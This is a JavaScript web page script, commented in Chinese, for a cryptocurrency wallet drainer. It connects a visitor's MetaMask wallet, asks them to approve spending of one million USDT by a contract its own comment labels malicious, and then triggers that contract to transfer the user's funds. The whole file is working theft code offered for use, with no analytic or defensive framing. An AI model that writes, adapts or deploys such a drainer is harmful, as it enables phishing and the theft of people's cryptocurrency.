// USDT 合约地址（主网）
const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 替换为您的 USDT 合约地址
// 您的恶意合约地址
const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; 

// ABI
const usdtAbi = [
    {
        "inputs": [
            { "internalType": "address", "name": "spender", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "sender", "type": "address" },
            { "internalType": "address", "name": "recipient", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const maliciousContractAbi = [
    {
        "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
        "name": "executeTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let signer, userAddress;

// 连接钱包
async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        document.getElementById("authorizeButton").disabled = false;
        document.getElementById("executeTransferButton").disabled = false;
        console.log("钱包连接成功:", userAddress);
    } else {
        alert("请安装 MetaMask!");
    }
}

// 授权转账
async function authorizeTransfer() {
    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
    const amount = ethers.utils.parseUnits("1000000", 6); // 1000000 USDT（USDT 通常有6位小数）

    try {
        const tx = await usdtContract.approve(contractAddress, amount);
        await tx.wait();
        console.log("授权成功:", tx);
    } catch (error) {
        console.error("授权失败:", error);
    }
}

// 执行转账
async function executeTransfer() {
    const maliciousContract = new ethers.Contract(contractAddress, maliciousContractAbi, signer);

    try {
        const tx = await maliciousContract.executeTransfer(userAddress);
        await tx.wait();
        console.log("转账成功:", tx);
    } catch (error) {
        console.error("转账失败:", error);
    }
}

// 事件绑定
document.getElementById("connectButton").onclick = connectWallet;
document.getElementById("authorizeButton").onclick = authorizeTransfer;
document.getElementById("executeTransferButton").onclick = executeTransfer;
